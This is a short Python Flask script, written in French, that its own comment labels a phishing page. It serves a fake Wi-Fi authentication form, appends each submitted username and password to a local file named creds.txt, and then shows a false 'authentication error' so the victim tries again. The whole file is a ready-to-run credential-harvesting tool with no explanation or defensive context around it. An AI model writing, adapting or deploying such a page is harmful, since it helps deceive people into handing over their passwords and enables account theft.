#!/usr/bin/env python3

from flask import Flask, request, render_template_string

app = Flask(__name__)

# Page de phishing (fake login page)
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Authentification Wi-Fi</title>
</head>
<body>
    <h2>Connexion requise</h2>
    <form method="POST">
        Nom d'utilisateur : <input type="text" name="username"><br>
        Mot de passe : <input type="password" name="password"><br>
        <input type="submit" value="Se connecter">
    </form>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def phishing():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        with open("creds.txt", "a") as f:
            f.write(f"Username: {username}, Password: {password}\n")
        return "Erreur d'authentification, veuillez réessayer."
    return render_template_string(HTML_PAGE)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
